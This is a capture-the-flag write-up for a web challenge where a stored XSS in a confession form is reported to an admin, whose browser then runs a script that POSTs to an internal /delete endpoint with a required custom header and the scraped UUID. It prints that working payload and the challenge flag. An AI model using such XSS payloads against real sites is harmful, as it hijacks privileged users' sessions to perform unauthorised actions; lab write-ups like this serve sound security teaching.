## Walkthrough

Seems like we are able to add "Confesssions" which can then be "reported" to an admin. ðŸ¤” Immediately we think of client-side attacks such as XSS or CSRF.

The goal is to get the admin to delete a submitted confession, which will have a UUID tied to it. Each UUID is also stored as a session cookie.

Upon submitting a confession, we get directed to `/viewpage` which contains the current session's confession:

There is also a way to send this confession to the admin by clicking on the "report" link.

Observe that the confession form is vulnerable to XSS. So we can enter something like:

```js
<script>
    alert(1);
</script>
```

Also, the source code for this application is given. Let us find if there is a function for the admin to delete our confession:

```js
app_flag.post('/delete', (req, res) => {
    // force a preflighted fetch using custom header so Access-Control-Allow-Methods is enforced
    if (req.header('X-NO-POST') !== 'true') {
        res.status(500).send('Not allowed, very illegal, calling polis');
    } else {
        let uuid = req.body.uuid;
        if (uuid in DATABASE) {
            let entry = DATABASE[uuid];
            entry.deleted = true;
            res.end('Deleted.')
        } else {
            res.status(404).send('Entry not found.')
        }
    }
});
```

However, this routing belongs to `app_flag` which is another application located at the server's port `12345`. This means that we need to send a HTTP `POST` request to `http://localhost:12345/delete` in order to reach the function above to delete our confession.

There is another constraint, that is that the request must contain the header `X-NO-POST` set to `true`. We also need to supply the `uuid` in the request body.

We now have a clear path of attack:
1. XSS the confession form and "report" it to the admin, triggering a visit to the `/viewpage` which triggers our payload.
2. Payload must make a `POST` request to `http://localhost:12345/delete` containing the `X-NO-POST` header and the `uuid` to delete.

We can obtain the `uuid` from the `/viewpage` itself:

```js
let uuid = $( "#uuid" ).html().split("#")[1];
```

Now, the final payload is as such:

```js
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://127.0.0.1:12345/delete', true);
    xhr.setRequestHeader('X-NO-POST', 'true');
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    let uuid = $( "#uuid" ).html().split("#")[1];
    xhr.send('uuid='.concat(uuid));
</script>
```

After sending this confession, we `/report` it and `/view` it:

Giving us the flag: `CTFSG{admin_please_update_the_page_more_frequently_thanks}`
